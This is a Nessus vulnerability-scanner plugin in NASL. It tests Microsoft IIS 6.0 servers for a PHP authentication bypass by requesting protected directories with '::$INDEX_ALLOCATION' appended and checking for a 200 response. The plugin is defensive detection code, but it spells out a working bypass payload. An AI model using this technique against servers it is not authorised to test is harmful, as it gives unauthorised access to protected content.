#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(59817);
  script_version("1.8");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");
  script_bugtraq_id(53906);
  script_xref(name:"EDB-ID", value:"19033");

  script_name(english:"Microsoft IIS 6.0 PHP NTFS Stream Authentication Bypass");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an authentication bypass
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Microsoft IIS installed on the remote host is affected
by an authentication bypass vulnerability. It is possible to access
PHP files in protected web directories without authentication by
appending '::$INDEX_ALLOCATION' to the directory name.");
  script_set_attribute(attribute:"see_also", value:"https://packetstormsecurity.com/files/113497/iis-bypass.txt");
  script_set_attribute(attribute:"see_also", value:"https://msdn.microsoft.com/en-us/library/ff469210.aspx");
  script_set_attribute(attribute:"solution", value:
"There is no known solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/06/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/07/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:iis:6.0");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2022 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_keys("Settings/ParanoidReport", "www/PHP", "www/iis");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80, 443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");

app = "Microsoft IIS";

if (report_paranoia < 2)
  audit(AUDIT_PARANOID);

get_kb_item_or_exit("www/PHP");
get_kb_item_or_exit("www/iis");

port = get_http_port(default:80);

# Make sure this is IIS.
banner = get_http_banner(port:port);
if (!banner)
  audit(AUDIT_WEB_BANNER_NOT, port);
if ("IIS/" >!< banner)
  audit(AUDIT_WRONG_WEB_SERVER, port, app);

# We need a protected directory for our test.
pages = get_kb_list("www/" + port + "/content/auth_required");
if (isnull(pages))
  exit(1, "No protected pages were detected on the web server on port " + port + ".");
pages = make_list(pages);

# Try to access some commonly-named PHP files that *might* be in the
# protected directory.
files = make_list("index.php", "login.php", "admin.php");

# Limit the number of requests we're making.
cur_req = 0;
max_req = 5;

vuln = FALSE;
foreach page (pages)
{
  # Filter out anything that's not a directory.
  if (page !~ "/$")
    continue;
  dir = ereg_replace(string:page, pattern:"/$", replace:"");

  foreach file (files)
  {
    url = dir + "::$INDEX_ALLOCATION/" + file;
    res = http_send_recv3(
      method       : "GET",
      item         : url,
      port         : port,
      exit_on_fail : TRUE
    );

    if (res[0] =~ "^HTTP/1\.1 200")
    {
      vuln = TRUE;
      break;
    }
  }

  if (vuln)
    break;

  cur_req++;
  if (!thorough_tests && cur_req > max_req)
    break;
}

if (!vuln)
  audit(AUDIT_LISTEN_NOT_VULN, app, port);

report = NULL;
if (report_verbosity > 0)
{
  report =
    '\nNessus was able to reproduce the issue using the following URL :' +
    '\n' +
    '\n  ' + build_url(port:port, qs:url) +
    '\n';
}

security_hole(port:port, extra:report);
